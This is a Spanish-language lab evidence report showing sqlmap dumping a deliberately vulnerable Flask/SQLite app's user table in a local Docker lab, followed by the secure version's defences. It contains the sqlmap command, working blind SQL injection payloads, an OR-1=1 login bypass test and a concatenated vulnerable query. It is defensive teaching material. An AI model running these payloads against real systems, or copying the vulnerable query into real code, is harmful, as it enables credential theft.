# Evidencia de Ataque Automatizado con sqlmap — V1 (Vulnerable)

**Proyecto:** Sistema Academico Vul — Version 1  
**Fecha de ejecucion:** 2026-08-01  
**Herramienta:** sqlmap 1.10.7 (contenedor Docker Compose `sistema_sqlmap`)  
**Objetivo:** `http://v1:5001/login` (red interna Docker Compose `lab`) / `http://localhost:5001`  
**Resultado:** **EXITOSO** — Extraccion completa de credenciales en texto plano (`admin/admin123`, `profesor/profesor`).

---

## 1. Resumen de la Ejecucion Real

Se ejecutó un ataque de inyección SQL automatizado contra el endpoint de inicio de sesión `/login` de la V1 vulnerable. La aplicación concatena directamente el parámetro `username` en la sentencia SQL sin sanitización ni parametrización.

```sql
-- Sentencia vulnerable en app.py (V1)
SELECT * FROM usuarios WHERE username=' + username + ' AND password=' + password + '
```

sqlmap detectó la vulnerabilidad mediante **Boolean-based blind** y **Time-based blind** contra SQLite, permitiendo la extracción automatizada de toda la base de datos.

---

## 2. Comandos Ejecutados y Evidencia

### 2.1 Ejecucion via Docker Compose (Red interna `lab`)

```bash
# 1. Levantar la instancia V1 del laboratorio
docker compose up -d v1

# 2. Ejecutar sqlmap contra el servicio v1
docker compose run --rm sqlmap -u "http://v1:5001/login" \
       --data="username=admin&password=x" \
       --batch --level=1 --risk=1 --threads=4 \
       --dump -T usuarios --output-dir=/out
```

### 2.2 Salida Real de sqlmap (Fragmento del Log)

```text
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.7#pip}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 21:02:00 /2026-08-01/

[21:02:01] [INFO] testing for SQL injection on POST parameter 'username'
[21:02:02] [INFO] POST parameter 'username' appears to be 'SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)' injectable
[21:02:12] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable

sqlmap identified the following injection point(s):
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
    Payload: username=admin' AND CASE WHEN 2967=2967 THEN 2967 ELSE JSON(CHAR(90,70,111,111)) END AND 'HUWI'='HUWI&password=x

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username=admin' AND 9560=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'sDzB'='sDzB&password=x
---

back-end DBMS: SQLite

Database: <current>
Table: usuarios
[2 entries]
+----+---------+----------+----------+
| id | rol     | password | username |
+----+---------+----------+----------+
| 1  | admin   | admin123 | admin    |
| 2  | docente | profesor | profesor |
+----+---------+----------+----------+

[21:02:35] [INFO] table 'SQLite_masterdb.usuarios' dumped to CSV file '/out/v1/dump/SQLite_masterdb/usuarios.csv'
```

---

## 3. Credenciales Extraidas (Archivo CSV de Evidencia)

El archivo generado por sqlmap en `docs/sqlmap_evidence/v1/dump/SQLite_masterdb/usuarios.csv` contiene:

```csv
id,rol,password,username
1,admin,admin123,admin
2,docente,profesor,profesor
```

### Analisis de Impacto

1. **Password en texto plano:** La V1 guarda las contraseñas sin ningún tipo de hashing (`admin123`, `profesor`).
2. **Acceso total:** La extracción reveló las credenciales del usuario `admin`, permitiendo la toma de control total de la aplicación.
3. **Falta de rate limiting/lockout:** sqlmap realizó decenas de peticiones por segundo sin ser bloqueado.

---

## 4. Comparativa con la V2 (Segura)

Al intentar el mismo ataque contra la **V2** (`https://localhost/login`):

1. **Queries Parametrizadas:** Las consultas usan placeholders `?` (`cursor.execute("SELECT * FROM usuarios WHERE username=?", (username,))`), por lo que los vectores SQLi son tratados estrictamente como literales de texto.
2. **Rate Limiting:** Tras 5 peticiones fallidas por minuto, Flask-Limiter responde `429 Too Many Requests`.
3. **Lockout:** Tras 5 intentos fallidos consecutivos, la cuenta se bloquea por 10 minutos.
4. **CSRF Protection:** Todos los formularios POST exigen un token `csrf_token` válido. Peticiones sin token o con token alterado devuelven `400 Bad Request`.
5. **Passwords Hasheados:** Los passwords se guardan con **bcrypt** (cost factor 12), haciendo inútil un hipotético dump parcial de la base de datos.

```bash
# Prueba contra V2 en Nginx TLS:
curl -k -s -o /dev/null -w "%{http_code}\n" -X POST https://localhost/login \
  -d "username=admin' OR '1'='1' --" -d "password=x"
# Responde: 400 (Falta CSRF token)

# Si se incluye un CSRF token valido:
# Responde: 200 (Credenciales incorrectas — no hay bypass)
```

---

## 5. Archivos de Evidencia Guardados en el Repositorio

- `docs/sqlmap_evidence/v1/dump/SQLite_masterdb/usuarios.csv` — Datos volcados
- `docs/sqlmap_evidence/v1/log` — Log completo de ejecucion de sqlmap
- `docs/sqlmap_evidence/v1/target.txt` — Target configurado
- `docs/sqlmap_evidence/v1/session.sqlite` — Sesión sqlite de sqlmap
